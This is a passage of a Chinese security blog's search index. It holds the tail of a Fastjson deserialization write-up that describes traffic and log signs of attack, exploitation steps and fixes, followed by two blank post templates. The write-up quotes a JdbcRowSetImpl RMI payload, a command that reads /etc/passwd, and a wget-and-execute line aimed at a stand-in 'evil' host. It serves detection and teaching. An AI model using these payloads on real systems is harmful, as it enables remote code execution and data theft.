title="频繁的请求模式："></a>频繁的请求模式：</h6><p>攻击者在尝试利用漏洞时，可能会发送多个不同的请求来测试和验证漏洞是否存在，或者进行一系列的操作来完成整个攻击流程。因此，流量包中可能会出现相对频繁且具有一定规律的请求模式，与正常的业务请求模式不同。</p><h6 id="数据传输量异常："><a href="#数据传输量异常：" class="headerlink" title="数据传输量异常："></a>数据传输量异常：</h6><p>与正常业务数据传输相比，包含恶意 JSON 数据的流量包可能会在数据量上表现出异常。因为恶意构造的数据可能包含较长的类名、复杂的参数值（如恶意的 dataSourceName 地址）等，导致传输的数据量比正常情况大。</p><h6 id="请求来源异常："><a href="#请求来源异常：" class="headerlink" title="请求来源异常："></a>请求来源异常：</h6><p>如果应用系统有固定的访问来源或正常的业务访问模式，而攻击流量的来源可能来自一些不常见的 IP 地址或地理位置，这也可以作为一个攻击特征在流量包中体现出来。</p><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>日志特征</p><p><img src="/img/image-20250817175206768.png" alt="image-20250817175206768"></p><p>异常请求记录：有与正常请求不同的 POST 请求记录，请求路径可能是应用中与 Fastjson 解析相关的接口。并且请求体中包含恶意构造的 JSON 数据，例如{“b”:{“@type”:”com.sun.rowset.jdbcrowsetimpl”,”datasourcename”:”rmi:&#x2F;&#x2F;192.168.142.133:1099&#x2F;tmhawa”,”autocommit”:true}}，这是利用漏洞尝试连接远程 RMI 服务器以执行恶意代码的典型特征。</p><p>频繁请求：可能出现来自同一 IP 地址或不同 IP 地址的大量相似请求，都试图利用漏洞执行不同的恶意操作，如多次尝试连接不同的远程服务器或执行不同的命令。</p><p>系统命令执行日志：如果攻击者成功利用漏洞执行了系统命令，Docker 日志中可能会出现相应的命令执行记录以及执行结果。比如执行touch &#x2F;tmp&#x2F;test命令来创建一个测试文件，日志中可能会有类似Executing command: touch &#x2F;tmp&#x2F;test的记录，或者是执行cat &#x2F;etc&#x2F;passwd命令读取用户信息，也会有相应的记录显示。</p><p>类加载错误：由于攻击者构造的恶意 JSON 数据可能尝试加载不存在或无权限访问的类，Fastjson 在解析时可能会产生类加载错误日志。例如，日志中出现ClassNotFoundException: com.sun.rowset.jdbcrowsetimpl等类似的错误信息，提示找不到指定的类。</p><p>连接错误：当攻击者尝试连接远程 RMI 服务器时，如果服务器不存在、端口未开放或网络连接有问题，会产生连接错误日志。如java.rmi.ConnectException: Connection refused to host: 192.168.142.133; nested exception is: java.net.ConnectException: Connection refused，表明无法连接到指定的远程服务器。</p><h2 id="漏洞利用行为总结"><a href="#漏洞利用行为总结" class="headerlink" title="漏洞利用行为总结"></a>漏洞利用行为总结</h2><p>针对漏洞利用过程中的流量和服务器日志进行发现，总结漏洞利用过程中行为特征如下：<br>构造恶意 JSON 数据：攻击者会构造包含特定类和方法调用的 JSON 数据，利用 Fastjson 的反序列化机制，将 JSON 数据转换为 Java 对象时执行恶意代码。例如，利用com.sun.rowset.JdbcRowSetImpl类的特性，通过设置datasourcename属性来指定远程 RMI 服务器地址和端口，尝试连接远程服务器并执行恶意代码。</p><p>发送恶意请求：攻击者将构造好的恶意 JSON 数据通过 HTTP 请求发送到使用 Fastjson 进行 JSON 解析的目标应用程序接口。这通常是一个 POST 请求，请求体中包含恶意 JSON 数据，Content - Type 设置为application&#x2F;json。</p><p>触发反序列化漏洞：目标应用程序接收到请求后，使用 Fastjson 对请求体中的 JSON 数据进行反序列化处理。由于 Fastjson 在反序列化过程中没有对输入进行充分的验证和过滤，导致恶意代码被执行。</p><p>执行恶意代码：一旦反序列化过程被利用，攻击者可以执行任意代码，如连接远程服务器下载并执行恶意软件、读取或篡改服务器上的敏感文件、获取系统权限等。例如，攻击者可以利用漏洞执行系统命令，如cat &#x2F;etc&#x2F;passwd读取用户信息，或通过执行wget <a href="http://evil/">http://evil</a> - server &#x2F; malicious - file &amp;&amp; chmod + x malicious - file &amp;&amp;.&#x2F;malicious - file下载并执行恶意文件。</p><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><p>升级 Fastjson 版本：将 Fastjson 升级到官方修复该漏洞的版本，建议使用 1.2.47 及以上版本。在升级前，需全面评估应用程序与新版本 Fastjson 的兼容性，可在测试环境中进行充分测试，确保升级后应用程序能正常运行。</p><p>输入验证与过滤：对接收的 JSON 数据进行严格的输入验证和过滤，阻止包含恶意类名、方法名或特定关键词的 JSON 数据进入反序列化流程。可以使用正则表达式或其他验证机制，检查 JSON 数据中的类名是否在允许的白名单内，防止非法类被反序列化。</p><p>安全配置 Fastjson：配置 Fastjson 的反序列化特性，限制反序列化的类范围，只允许特定的、信任的类进行反序列化。同时，禁用自动类型转换等可能存在风险的功能，降低漏洞被利用的可能性。例如，在使用 Fastjson 解析 JSON 数据时，通过设置ParserConfig来指定允许反序列化的类。</p><p>及时关注安全公告：关注 Fastjson 官方的安全公告和更新信息，及时了解并处理新发现的安全问题。建立安全信息收集机制，以便在出现新漏洞时能快速响应并采取相应的修复措施。</p><p>安全编码规范：开发人员应遵循安全编码规范，避免在代码中出现可被利用的安全隐患。例如，避免直接使用用户输入来构造反序列化对象，对不可信的输入进行充分的净化和验证。同时，定期进行代码审查，检查是否存在潜在的安全漏洞。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><p><a href="https://www.cnblogs.com/Junglezt/p/18137413">https://www.cnblogs.com/Junglezt/p/18137413</a></p><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>这是24年上半年复现的洞了，现在搞个博客才发，就当简单记录和复习了</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【项目名称】- 安全工具/系统开发实践</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>简要介绍该安全项目的基本情况，包括项目目标、解决的问题和应用场景。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><h3 id="项目起源"><a href="#项目起源" class="headerlink" title="项目起源"></a>项目起源</h3><p>描述项目的起源和开发动机。</p><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><p>详细说明该项目要解决的具体安全问题。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><p>介绍项目使用的主要技术栈和选型理由。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>描述系统的整体架构设计。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[架构图或流程图]</span><br></code></pre></td></tr></table></figure><h3 id="核心模块"><a href="#核心模块" class="headerlink" title="核心模块"></a>核心模块</h3><ul><li>模块1：功能描述</li><li>模块2：功能描述</li><li>模块3：功能描述</li></ul><h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h3><p>详细介绍项目中使用的关键技术和实现方法。</p><h2 id="💻-核心代码实现"><a href="#💻-核心代码实现" class="headerlink" title="💻 核心代码实现"></a>💻 核心代码实现</h2><h3 id="模块1实现"><a href="#模块1实现" class="headerlink" title="模块1实现"></a>模块1实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块1功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="模块2实现"><a href="#模块2实现" class="headerlink" title="模块2实现"></a>模块2实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 核心代码示例</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">another_function</span>():<br>    <span class="hljs-comment"># 实现逻辑</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;模块2功能实现&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="📊-项目效果"><a href="#📊-项目效果" class="headerlink" title="📊 项目效果"></a>📊 项目效果</h2><h3 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h3><p>描述项目的主要功能和效果。</p><h3 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h3><table><thead><tr><th>指标</th><th>数值</th><th>说明</th></tr></thead><tbody><tr><td>指标1</td><td>XX</td><td>说明</td></tr><tr><td>指标2</td><td>XX</td><td>说明</td></tr><tr><td>指标3</td><td>XX</td><td>说明</td></tr></tbody></table><h3 id="实际应用案例"><a href="#实际应用案例" class="headerlink" title="实际应用案例"></a>实际应用案例</h3><p>分享项目在实际场景中的应用案例。</p><h2 id="🔧-部署指南"><a href="#🔧-部署指南" class="headerlink" title="🔧 部署指南"></a>🔧 部署指南</h2><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ul><li>操作系统：XXX</li><li>依赖组件：XXX</li><li>硬件要求：XXX</li></ul><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a>配置说明</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># 配置文件示例</span><br><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br>  <br><span class="hljs-attr">security:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="🚀-使用指南"><a href="#🚀-使用指南" class="headerlink" title="🚀 使用指南"></a>🚀 使用指南</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>描述项目的基本使用方法。</p><h3 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h3><p>介绍项目的高级功能和使用技巧。</p><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><p>列出使用过程中可能遇到的常见问题和解决方法。</p><h2 id="📈-项目展望"><a href="#📈-项目展望" class="headerlink" title="📈 项目展望"></a>📈 项目展望</h2><h3 id="当前不足"><a href="#当前不足" class="headerlink" title="当前不足"></a>当前不足</h3><p>分析项目目前存在的不足和限制。</p><h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>介绍项目的未来发展计划和方向。</p><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考资料1</a></li><li><a href="https://example.com/">参考资料2</a></li><li><a href="https://github.com/example">开源项目地址</a></li></ul><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>分享项目开发过程中的心得体会和经验总结。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【漏洞编号】- 【漏洞名称】深度分析</title>
    <link href="/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><p>简要介绍该漏洞的基本情况，包括漏洞类型、影响范围、CVSS评分等。</p><span id="more"></span><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>漏洞编号</td><td>CVE-20XX-XXXXX</td></tr><tr><td>披露时间</td><td>20XX年XX月XX日</td></tr><tr><td>影响版本</td><td>X.X.X - X.X.X</td></tr><tr><td>漏洞评级</td><td>严重&#x2F;高危&#x2F;中危&#x2F;低危</td></tr><tr><td>修复版本</td><td>X.X.X</td></tr></tbody></table><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>详细分析漏洞产生的技术原因，包括代码缺陷、设计缺陷等。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul><li>受影响的系统</li><li>受影响的组件</li><li>受影响的用户群体</li></ul><h2 id="💻-漏洞分析"><a href="#💻-漏洞分析" class="headerlink" title="💻 漏洞分析"></a>💻 漏洞分析</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 有漏洞的代码片段</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">vulnerable_function</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">10</span>];<br>    gets(buffer);  <span class="hljs-comment">// 缓冲区溢出漏洞</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h3><p>详细描述触发漏洞所需的条件和环境。</p><h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>分析漏洞可能的利用方式和攻击向量。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>详细说明如何搭建漏洞复现环境。</p><h3 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h3><ol><li>第一步</li><li>第二步</li><li>第三步</li></ol><h3 id="漏洞利用代码"><a href="#漏洞利用代码" class="headerlink" title="漏洞利用代码"></a>漏洞利用代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 漏洞利用PoC</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_vulnerability</span>():<br>    payload = <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">20</span>  <span class="hljs-comment"># 构造溢出数据</span><br>    <span class="hljs-comment"># 发送payload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;发送漏洞利用载荷...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-修复方案"><a href="#🛡️-修复方案" class="headerlink" title="🛡️ 修复方案"></a>🛡️ 修复方案</h2><h3 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h3><p>分析官方发布的修复方案和补丁。</p><h3 id="临时缓解措施"><a href="#临时缓解措施" class="headerlink" title="临时缓解措施"></a>临时缓解措施</h3><p>在无法立即应用补丁的情况下可采取的临时措施。</p><h3 id="最佳实践建议"><a href="#最佳实践建议" class="headerlink" title="最佳实践建议"></a>最佳实践建议</h3><p>预防类似漏洞的最佳实践和安全建议。</p><h2 id="📊-时间线"><a href="#📊-时间线" class="headerlink" title="📊 时间线"></a>📊 时间线</h2><table><thead><tr><th>时间</th><th>事件</th></tr></thead><tbody><tr><td>20XX-XX-XX</td><td>漏洞被发现</td></tr><tr><td>20XX-XX-XX</td><td>漏洞报告给厂商</td></tr><tr><td>20XX-XX-XX</td><td>厂商确认漏洞</td></tr><tr><td>20XX-XX-XX</td><td>补丁发布</td></tr><tr><td>20XX-XX-XX</td><td>漏洞公开</td></tr></tbody></table><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://cve.mitre.org/">CVE详情</a></li><li><a href="https://example.com/">厂商公告</a></li><li><a href="https://example.com/">技术分析文章</a></li></ul><h2 id="💡-总结与启示"><a href="#💡-总结与启示" class="headerlink" title="💡 总结与启示"></a>💡 总结与启示</h2><p>对该漏洞的总结评价和安全启示。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>安全研究</tag>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
